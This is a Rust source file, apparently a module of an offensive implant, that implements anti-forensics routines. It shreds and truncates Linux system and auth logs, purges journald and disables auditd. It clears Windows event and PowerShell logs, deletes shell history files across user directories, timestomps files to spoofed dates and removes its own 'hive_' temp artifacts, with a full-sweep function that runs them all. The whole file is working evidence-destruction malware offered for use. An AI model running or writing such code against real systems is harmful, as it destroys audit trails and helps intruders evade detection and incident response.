use std::path::Path;
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};
use tracing::info;

pub struct AntiForensics;

impl AntiForensics {
    /// Wipe system logs — Linux: journalctl, syslog, auth.log, lastlog
    #[cfg(target_os = "linux")]
    pub fn wipe_logs() -> Vec<String> {
        let mut results = Vec::new();
        let targets = [
            "/var/log/syslog",
            "/var/log/messages",
            "/var/log/auth.log",
            "/var/log/kern.log",
            "/var/log/dmesg",
            "/var/log/btmp",
            "/var/log/wtmp",
            "/var/log/lastlog",
            "/var/log/faillog",
            "/var/log/maillog",
            "/var/log/mail.log",
            "/var/log/daemon.log",
            "/var/log/debug",
            "/var/log/bootstrap.log",
        ];

        for log in &targets {
            let path = Path::new(log);
            if path.exists() {
                if let Ok(meta) = path.metadata() {
                    if meta.len() > 0 {
                        // Truncate with shred-style overwrite
                        Self::secure_truncate(path);
                        results.push(format!("wiped {}", log));
                    }
                }
            }
        }

        // Journald
        let journal_cmds = [
            "journalctl --rotate --vacuum-time=1s 2>/dev/null",
            "journalctl --flush 2>/dev/null",
            "rm -rf /var/log/journal/* 2>/dev/null",
            "rm -rf /run/log/journal/* 2>/dev/null",
        ];
        for cmd in &journal_cmds {
            let _ = Command::new("sh").arg("-c").arg(cmd).output();
        }
        results.push("journald rotated and purged".into());

        // Auditd
        let _ = Command::new("auditctl")
            .arg("-e")
            .arg("0")
            .output()
            .ok();
        let _ = Command::new("sh")
            .arg("-c")
            .arg("echo '' > /var/log/audit/audit.log 2>/dev/null")
            .output()
            .ok();
        results.push("auditd suppressed".into());

        results
    }

    #[cfg(target_os = "windows")]
    pub fn wipe_logs() -> Vec<String> {
        let mut results = Vec::new();
        let channels = ["system", "security", "application", "setup", "forwardedevents"];
        for ch in &channels {
            let _ = Command::new("wevtutil")
                .args(["cl", ch])
                .output()
                .ok();
            results.push(format!("cleared EventLog {}", ch));
        }
        // Also wipe PowerShell operational log
        let _ = Command::new("wevtutil")
            .args(["cl", "Windows PowerShell"])
            .output()
            .ok();
        results.push("cleared PowerShell log".into());
        results
    }

    #[cfg(not(any(target_os = "linux", target_os = "windows")))]
    pub fn wipe_logs() -> Vec<String> {
        vec!["Log wiping not supported on this platform".into()]
    }

    /// Clean shell history
    #[cfg(target_os = "linux")]
    pub fn wipe_history() -> Vec<String> {
        let mut results = Vec::new();
        let history_files = [
            ".bash_history",
            ".zsh_history",
            ".fish_history",
            ".sh_history",
            ".python_history",
            ".mysql_history",
            ".psql_history",
            ".redis_history",
            ".node_repl_history",
        ];

        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
        let root = std::env::var("HOME").unwrap_or_else(|_| "/root".into());

        for users_dir in [&home, &root, "/home", "/var/root"] {
            for hist in &history_files {
                let path = Path::new(users_dir).join(hist);
                if path.exists() {
                    Self::secure_truncate(&path);
                    results.push(format!("wiped {}", path.display()));
                }
            }
        }

        // Also find any .*_history in common dirs
        let _ = Command::new("sh")
            .arg("-c")
            .arg("find /root /home /tmp -name '*_history' -type f -exec shred -f -u {} \\; 2>/dev/null")
            .output()
            .ok();
        results.push("history sweep via find".into());

        results
    }

    #[cfg(target_os = "windows")]
    pub fn wipe_history() -> Vec<String> {
        let mut results = Vec::new();
        // PowerShell history
        let ps_history = format!(
            "{}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
            std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Public".into())
        );
        let path = Path::new(&ps_history);
        if path.exists() {
            let _ = std::fs::write(path, "");
            results.push("wiped PowerShell history".into());
        }
        // CMD history (doskey)
        let _ = Command::new("reg")
            .args(["delete", "HKCU\\Console", "/v", "HistoryBufferSize", "/f"])
            .output()
            .ok();
        results.push("cleared CMD console history".into());
        results
    }

    #[cfg(not(any(target_os = "linux", target_os = "windows")))]
    pub fn wipe_history() -> Vec<String> {
        vec!["History wiping not supported on this platform".into()]
    }

    /// Timestomp a file: set mtime/atime to a spoofed value
    pub fn timestomp(path: &str, spoof_timestamp: Option<i64>) -> bool {
        let path = Path::new(path);
        if !path.exists() {
            return false;
        }

        let ts = spoof_timestamp.unwrap_or_else(|| {
            // Random timestamp within last 90 days
            let now = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_secs();
            let offset = (std::time::SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_millis() as u64)
                % (90 * 86400);
            (now - offset) as i64
        });

        #[cfg(unix)]
        {
            let status = Command::new("touch")
                .args(["-t", &format!("@{}", ts), path.to_str().unwrap_or("")])
                .status()
                .ok();
            status.is_some_and(|s| s.success())
        }

        #[cfg(windows)]
        {
            // On Windows, use SetFileTime via explicit API
            // For now, fallback to fs::set_file_times (Rust std)
            let atime = std::time::UNIX_EPOCH + std::time::Duration::from_secs(ts as u64);
            let mtime = atime;
            let _result = match std::fs::File::open(path) {
                Ok(f) => {
                    #[cfg(windows)]
                    {
                        use std::os::windows::io::AsRawHandle;
                        let handle = f.as_raw_handle() as isize as *mut std::ffi::c_void;
                        extern "system" {
                            fn SetFileTime(
                                hFile: *mut std::ffi::c_void,
                                lpCreationTime: *const i64,
                                lpLastAccessTime: *const i64,
                                lpLastWriteTime: *const i64,
                            ) -> i32;
                        }
                        let ts_100ns = ts as i64 * 10_000_000 + 116_444_736_00_000_000_0i64;
                        unsafe {
                            SetFileTime(handle, std::ptr::null(), &ts_100ns, &ts_100ns);
                        }
                    }
                    true
                }
                Err(_) => false,
            };
            _result
        }

        #[cfg(not(any(unix, windows)))]
        {
            false
        }
    }

    /// Clean temporary artifacts: /tmp, /dev/shm, %TEMP%
    pub fn clean_temp() -> Vec<String> {
        let mut results = Vec::new();

        #[cfg(unix)]
        {
            let temp_dirs = ["/tmp/hive_", "/dev/shm/hive_"];
            for dir in &temp_dirs {
                let _ = Command::new("sh")
                    .arg("-c")
                    .arg(format!("rm -rf {}* 2>/dev/null", dir))
                    .output()
                    .ok();
            }
            results.push("cleaned /tmp/hive_* and /dev/shm/hive_*".into());

            // Also clean any files in /tmp owned by us
            let uid = unsafe { libc::getuid() };
            let _ = Command::new("sh")
                .arg("-c")
                .arg(format!("find /tmp -uid {} -type f -delete 2>/dev/null", uid))
                .output()
                .ok();
            results.push("cleaned temp files by uid".into());
        }

        #[cfg(windows)]
        {
            let temp = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".into());
            let hive_pattern = format!("{}\\hive_*", temp);
            let _ = Command::new("cmd")
                .args(["/c", &format!("del /q /f {}", hive_pattern)])
                .output()
                .ok();
            results.push(format!("cleaned {} hive_*", temp));
        }

        results
    }

    /// Run full anti-forensics sweep
    pub fn full_sweep() {
        info!("Anti-forensics sweep starting");
        let logs = Self::wipe_logs();
        for l in &logs {
            info!("  {}", l);
        }

        let hist = Self::wipe_history();
        for h in &hist {
            info!("  {}", h);
        }

        let temp = Self::clean_temp();
        for t in &temp {
            info!("  {}", t);
        }
        info!("Anti-forensics sweep complete");
    }

    fn secure_truncate(path: &Path) {
        // Overwrite with random data, then truncate
        if let Ok(meta) = path.metadata() {
            let len = meta.len();
            if len > 0 {
                // Write random data over the file, then truncate
                if let Ok(f) = std::fs::File::create(path) {
                    use std::io::Write;
                    let buf: Vec<u8> = (0..len.min(65536))
                        .map(|_| rand::random::<u8>())
                        .collect();
                    let mut written: u64 = 0;
                    let mut f = f;
                    while written < len {
                        let to_write = std::cmp::min(buf.len() as u64, len - written) as usize;
                        let _ = f.write(&buf[..to_write]);
                        written += to_write as u64;
                    }
                }
            }
        }
        let _ = std::fs::write(path, "");
    }
}
